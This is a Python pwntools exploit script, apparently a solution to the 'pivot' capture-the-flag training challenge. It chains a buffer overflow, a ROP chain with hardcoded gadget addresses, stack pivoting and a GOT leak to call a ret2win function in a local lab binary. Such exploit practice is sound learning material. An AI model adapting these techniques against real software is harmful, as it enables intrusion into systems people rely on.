#!/usr/bin/python3
# coding: utf-8

from pwn import *
import sys

# debug with GDB and Tmux
context.terminal = ["tmux", "splitw", "-h"]

## Start the process and store the stack pivot addr

proc = process('./pivot')
proc.recvuntil(b'to pivot: 0x')

stack_pivot_leak = proc.recvline()[:-1]
stack_pivot_addr = int(stack_pivot_leak, 16)


# 2nd part : Leak the address of ret2win

buf = p64(0x400726) # call foothold_function(), so that the address is resolved

## setup the argument for puts()
buf += p64(0x400a33) # pop rdi 
buf += p64(0x601040) # got entry for foothold_function()
buf += p64(0x4006e0) # puts@plt ()

## setup second passage in pwnme to exploit again the buffer overflow
buf += p64(0x4009bb) # pop rax
buf += p64(stack_pivot_addr) # an address on the stack to overwrite stored $rip when returning in read()

buf += p64(0x400989) # pwnme()+152 -> we go for a second ride ! 

## pad the payload
buf += b'A' * (296 - len(buf)) # pad with A until buffer overflow

# 1st part of the exploit : Stack Pivoting

buf += p64(0x04009bb) # pop rax
buf += p64(stack_pivot_addr) # addr where read() write the buffer
buf += p64(0x04009bd) # xchg rax rsp -> stack pivoting

#sys.stdout.buffer.write(buf)

proc.recvuntil(b'> ')
#input()

proc.send(buf)
proc.recvuntil(b'libpivot\n')


# 3rd part : calculate the address of ret2win()

foothold_leak = proc.recvline()[:-1] + b'\x00\x00'
print (hex(u64(foothold_leak)))

foothold_addr = u64(foothold_leak)
ret2win_addr = foothold_addr + 0x117

print("addr ret2win : " + hex (ret2win_addr))


# 4th part : Exploit again the buffer overflow in pwnme with the address of ret2win()
buf2  = b'B' * 48
buf2 += p64(ret2win_addr)

proc.send(buf2)

print (proc.recv())
